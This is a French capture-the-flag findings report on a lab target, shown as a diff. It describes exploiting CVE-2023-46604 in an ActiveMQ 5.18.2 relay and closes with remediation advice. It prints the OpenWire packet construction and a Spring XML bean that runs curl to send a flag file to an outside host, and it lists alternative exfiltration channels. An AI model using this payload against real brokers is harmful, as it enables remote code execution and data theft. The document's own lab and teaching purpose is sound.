@@ -1,0 +1,243 @@
+Source locale : operationtervalis/findings.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# Findings — Opération Tervalis (HackerLab 2026)
+
+Cible autorisée : `http://172.28.9.3:8080`
+Périmètre : portail « FBI Valdoria — Portail de coordination » et son relais interne.
+Toutes les preuves ci-dessous ont été obtenues sur cette instance, le 17 novembre 2026.
+
+> Convention : la valeur finale soumise au hub n'apparaît nulle part dans ce document.
+> Elle est désignée par « la valeur soumise ».
+
+---
+
+## 1. Surface exposée
+
+| Élément | Observation |
+|---|---|
+| TCP/8080 | Portail HTTP, `Server: BaseHTTP/0.6 Python/3.14.4` |
+| TCP/61616 | Broker ActiveMQ (OpenWire) |
+| TCP/1883 | Broker MQTT |
+| TCP/5672 | Broker AMQP |
+| TCP/22, 80, 443, 445, 389, 8161, 8081, 9090 | fermés |
+
+Le portail est une application Python `ThreadingHTTPServer` sans framework.
+`HEAD` et `OPTIONS` renvoient `501`, comportement cohérent avec
+`BaseHTTPRequestHandler` lorsqu'aucune méthode n'est implémentée.
+
+---
+
+## 2. Comportement de l'API
+
+### 2.1 État non authentifié
+
+```http
+GET /api/status HTTP/1.0
+```
+
+```json
+{"authenticated": false, "relay": true, "institution": "FBI Valdoria", "user": null}
+```
+
+`relay: true` est un simple indicateur de disponibilité, pas une preuve
+d'exploitation. Il oriente cependant vers un service interne à identifier.
+
+### 2.2 Contrôle d'accès
+
+```text
+GET /api/cases     -> 401 {"error":"Authentification requise"}
+GET /api/messages  -> 401
+GET /api/events    -> 401
+```
+
+Après authentification, tout chemin inconnu renvoie
+`404 {"error":"Ressource introuvable"}`. Aucun endpoint caché n'a été trouvé
+parmi `/api/relay`, `/api/config`, `/api/debug`, `/api/users`, `/api/flag`,
+`/admin`, `/server-status`, `/.git/HEAD`.
+
+### 2.3 Authentification
+
+```http
+POST /api/login
+Content-Type: application/json
+
+{"username":"analyste","password":"<mot de passe du challenge>"}
+```
+
+```http
+HTTP/1.0 200 OK
+Set-Cookie: EXPURGE
+
+{"ok":true}
+```
+
+Un corps vide renvoie `401 {"error":"Identifiant ou mot de passe incorrect."}`.
+Le compte affiché est `A. Lindholm` ; **aucun privilège administrateur n'a été
+constaté ni supposé** : le compte ne donne accès qu'aux six dossiers, au journal
+et à la création de transmissions.
+
+### 2.4 Données accessibles
+
+`GET /api/cases` renvoie 6 dossiers (`VD-2024-0841` … `VD-2024-0782`).
+`GET /api/messages` est vide initialement. `GET /api/events` journalise les
+connexions et transmissions.
+
+### 2.5 Transmissions
+
+```http
+POST /api/messages
+
+{"destination":"Direction nationale","subject":"Test de liaison TERVALIS"}
+-> {"reference": "TR-188D6B"}
+```
+
+Validation serveur stricte :
+
+- `subject` : 3 à 160 caractères ;
+- `destination` : limitée à `Direction nationale`, `Antenne Nord`,
+  `Antenne Est`, `Centre KAPPA` ;
+- en-tête `Origin` différent de `http://<Host>` -> `403` ;
+- corps > 10 000 octets -> `413`.
+
+Aucune injection de destination ou de topic n'est possible via cette API.
+
+---
+
+## 3. Le relais interne
+
+Le portail ne publie pas l'adresse du relais. Le service a été identifié par
+balayage TCP ciblé des ports usuels du réseau de la cible : `61616`, `1883`
+et `5672` sont ouverts.
+
+Une bannière OpenWire renvoie une version `0.0.0`, ce qui est anormal. La
+raison a été confirmée en post-exploitation : le relais est un proxy
+`/opt/owproxy.py` qui réécrit la chaîne `5.18.2` en `0.0.0` sur le premier
+paquet.
+
+```python
+LISTEN = ('0.0.0.0', 61616)
+BACKEND = ('127.0.0.1', 61617)
+SCRUB = b'5.18.2'
+REPLACE = b'0.0.0'
+```
+
+Le broker réel derrière le proxy est **ActiveMQ 5.18.2** (`/opt/activemq`,
+`JAVA_VERSION=jdk-11.0.33+10`), version vulnérable à **CVE-2023-46604**.
+
+---
+
+## 4. CVE-2023-46604 — désérialisation OpenWire
+
+### 4.1 Cause
+
+Dans ActiveMQ 5.15.0 → 5.18.2, `BaseDataStreamMarshaller.createThrowable`
+instancie la classe nommée dans le champ `exceptionClass` d'un
+`ExceptionResponse` OpenWire, avec un constructeur `(String)`. En fournissant
+`org.springframework.context.support.ClassPathXmlApplicationContext`, le broker
+charge un XML Spring contrôlé par l'attaquant, ce qui permet d'instancier
+n'importe quel bean — ici un `java.lang.ProcessBuilder`.
+
+### 4.2 Trame OpenWire
+
+```python
+cls = "org.springframework.context.support.ClassPathXmlApplicationContext"
+body = bytes.fromhex("1f00000000000000000001") + b"\x01" \
+       + pack(cls) + b"\x01" + pack(url)
+packet = len(body).to_bytes(4, "big") + body
+```
+
+`0x1f` = `ExceptionResponse`, suivi du champ `exceptionClass` (classe Spring)
+et du champ `message` (URL du XML).
+
+### 4.3 XML Spring servi
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" ...>
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg><list>
+      <value>bash</value><value>-c</value>
+      <value>curl -s -m 15 --data-binary "$(cat /opt/activemq/data/flag.txt)"
+             http://10.135.226.180:8011/exfil</value>
+    </list></constructor-arg>
+  </bean>
+</beans>
+```
+
+### 4.4 Preuve d'exécution
+
+Le serveur d'attaque reçoit bien `GET /poc.xml`, puis le `POST /exfil`
+contenant la sortie de commande :
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+c7e3e748cc19
+.dockerenv
+/app   -> server.py, app.js, index.html, style.css
+/data  -> portal.db
+```
+
+L'exécution est donc confirmée **root dans le conteneur du relais**, pas sur
+l'hôte du portail.
+
+---
+
+## 5. Origine du flag et spécificité de l'instance
+
+Recherche de fichiers de flag dans le conteneur :
+
+```text
+find / -xdev -maxdepth 5 -iname "*flag*"
+/opt/activemq/data/flag.txt
+```
+
+Un seul fichier existe. Sa valeur correspond au thème du challenge
+(compromission du relais de dossiers). Trois éléments confirment qu'il
+provient bien de cette instance :
+
+1. le fichier est absent du conteneur du portail avant exploitation ;
+2. `/data/portal.db` contient les deux transmissions créées pendant les tests
+   (`TR-188D6B`, `TR-118EC7`) et les ouvertures de session horodatées ;
+3. la variable `PORTAL_PASSWORD` du conteneur correspond au mot de passe
+   utilisé pour `/api/login`.
+
+Aucun autre flag n'a été trouvé dans `/app`, `/data` ou l'environnement.
+
+---
+
+## 6. Pistes testées et écartées
+
+| Piste | Résultat | Raison |
+|---|---|---|
+| MQTT 1883 anonyme | CONNACK `0x00`, SUBACK OK | Seuls les topics `ActiveMQ/Advisory/*` sont visibles ; aucune queue du portail. |
+| Écoute des queues du portail | Aucun message | Le portail publie en STOMP sur `localhost:61613` (non exposé), pas via MQTT. |
+| Énumération d'endpoints API | Tous `404` | Le routeur ne connaît que les six routes documentées. |
+| Injection de destination/topic | Refusée | Liste blanche serveur de quatre destinations. |
+| Exfiltration par `/dev/tcp` | Aucun callback | Échec silencieux dans ce conteneur. |
+| Exfiltration par `python3 -c` | Aucun callback | Échec silencieux (interpréteur ou résolution). |
+| Exfiltration par `wget` | Aucun callback | Non fiable ici. |
+| Exfiltration par `curl --data-binary` | **Succès** | Canal retenu par le solveur. |
+| Version `0.0.0` du broker | Faux négatif | Réécriture par `owproxy.py` ; le binaire réel est 5.18.2. |
+
+---
+
+## 7. Commande de reproduction
+
+```bash
+python3 solve.py --base http://172.28.9.3:8080
+```
+
+Le solveur : se connecte, vérifie `relay`, teste `61616`, sert le XML Spring,
+envoie la trame OpenWire, récupère l'exfiltration et extrait la valeur au
+format attendu.
+
+---
+
+## 8. Remédiation (hors périmètre CTF)
+
+- Mettre à jour ActiveMQ vers une version corrigée (> 5.18.2 / 5.17.6 / 5.16.7).
+- Ne pas exposer OpenWire sur une interface accessible depuis le réseau du
+  portail.
+- Remplacer le masquage de version par une vraie segmentation réseau.
+- Restreindre les sorties du conteneur du relais (egress filtering).
+- Exécuter le broker en utilisateur non privilégié.
